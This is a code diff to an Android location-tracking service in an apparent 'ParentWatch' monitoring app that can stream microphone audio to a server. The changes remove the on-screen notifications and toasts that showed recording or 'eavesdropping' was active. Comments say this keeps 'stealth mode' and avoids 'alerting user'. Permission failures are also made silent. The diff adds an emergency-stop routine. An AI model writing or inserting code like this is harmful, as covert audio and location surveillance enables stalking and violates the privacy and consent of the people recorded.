@@ -36,6 +36,7 @@ class LocationService : Service() {
 
         const val ACTION_START = "start"
         const val ACTION_STOP = "stop"
+        const val ACTION_EMERGENCY_STOP = "emergency_stop"
     }
 
     private lateinit var fusedLocationClient: FusedLocationProviderClient
@@ -73,6 +74,7 @@ class LocationService : Service() {
         when (intent?.action) {
             ACTION_START -> startTracking()
             ACTION_STOP -> stopTracking()
+            ACTION_EMERGENCY_STOP -> emergencyStopAll()
         }
 
         return START_STICKY
@@ -273,15 +275,13 @@ class LocationService : Service() {
                 }
                 "start_recording" -> {
                     audioRecorder.setRecordingMode(true)
-                    updateNotification("Запись аудио...")
+                    Log.d(TAG, "Recording mode enabled (silent)")
+                    // No notification update - keep stealth mode
                 }
                 "stop_recording" -> {
                     audioRecorder.setRecordingMode(false)
-                    if (isStreamingAudio) {
-                        updateNotification("Прослушка активна")
-                    } else {
-                        updateNotification("Отслеживание активно")
-                    }
+                    Log.d(TAG, "Recording mode disabled (silent)")
+                    // No notification update - keep stealth mode
                 }
             }
         }
@@ -302,15 +302,8 @@ class LocationService : Service() {
                 Manifest.permission.RECORD_AUDIO
             ) != PackageManager.PERMISSION_GRANTED
         ) {
-            Log.e(TAG, "Audio permission not granted")
-            serviceScope.launch(Dispatchers.Main) {
-                android.widget.Toast.makeText(
-                    this@LocationService,
-                    "⚠️ Нет разрешения на микрофон! Откройте настройки и дайте разрешение.",
-                    android.widget.Toast.LENGTH_LONG
-                ).show()
-            }
-            updateNotification("⚠️ Нужно разрешение на микрофон")
+            Log.e(TAG, "Audio permission not granted - streaming cannot start")
+            // Silent fail - no notifications to avoid alerting user
             return
         }
 
@@ -320,17 +313,9 @@ class LocationService : Service() {
         audioRecorder.startStreaming(deviceId, serverUrl, recording)
         isStreamingAudio = true
 
-        updateNotification("🎙️ Прослушка активна")
-        Log.d(TAG, "Audio streaming started")
-
-        // Show toast to confirm streaming started
-        serviceScope.launch(Dispatchers.Main) {
-            android.widget.Toast.makeText(
-                this@LocationService,
-                "🎙️ Прослушка начата! Отправка аудио...",
-                android.widget.Toast.LENGTH_SHORT
-            ).show()
-        }
+        // Keep notification text unchanged - "ParentWatch активен"
+        // Don't update to avoid alerting user
+        Log.d(TAG, "Audio streaming started (silent mode)")
     }
 
     /**
@@ -344,11 +329,38 @@ class LocationService : Service() {
         audioRecorder.stopStreaming()
         isStreamingAudio = false
 
-        updateNotification("Отслеживание активно")
-        Log.d(TAG, "Audio streaming stopped")
+        // Keep notification unchanged - stealth mode
+        Log.d(TAG, "Audio streaming stopped (silent mode)")
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
+
+    /**
+     * Emergency stop - stops ALL functions immediately
+     * Used when user wants to ensure everything is stopped (audio streaming, location tracking, etc.)
+     */
+    private fun emergencyStopAll() {
+        Log.w(TAG, "🚨 EMERGENCY STOP - Stopping all functions")
+
+        // Stop audio streaming immediately
+        if (isStreamingAudio) {
+            stopAudioStreaming()
+            Log.d(TAG, "✅ Audio streaming stopped")
+        }
+
+        // Stop location tracking
+        stopTracking()
+        Log.d(TAG, "✅ Location tracking stopped")
+
+        // Cancel all coroutines
+        commandCheckJob?.cancel()
+        Log.d(TAG, "✅ Command checking stopped")
+
+        // Show notification
+        Toast.makeText(this, "🚨 Экстренная остановка - все функции выключены", Toast.LENGTH_LONG).show()
+
+        Log.w(TAG, "🚨 EMERGENCY STOP COMPLETED")
+    }
 
     override fun onDestroy() {
         super.onDestroy()
